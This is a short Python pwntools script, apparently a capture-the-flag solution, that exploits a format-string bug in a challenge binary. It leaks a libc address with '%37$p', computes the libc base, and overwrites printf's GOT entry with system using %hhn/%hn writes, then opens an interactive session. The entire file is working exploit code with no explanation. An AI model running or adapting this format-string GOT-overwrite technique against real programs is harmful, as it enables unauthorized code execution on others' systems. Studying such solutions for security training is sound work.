from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")


p = process(exe.path)
p.sendlineafter(b'>> ',b'1') 
p.sendlineafter(b'Enter your payload: ',b'%37$p')
p.recvuntil(b'submitted\n')
libc_leak = int(p.recvline()[:-1],16)
libc.address = libc_leak - 171408 
printf_add = exe.got['printf']

p.sendlineafter(b'>> ',b'1') 
part1 = libc.sym['system'] & 0xff
part2 = libc.sym['system'] >> 8 & 0xffff

payload = f'%{part1}c%10$hhn'.encode()
payload += f'%{part2-part1}c%11$hn'.encode()
payload = payload.ljust(0x20,b'L')
payload += p64(printf_add) + p64(printf_add+1)
p.sendlineafter(b'Enter your payload: ',payload)
p.interactive()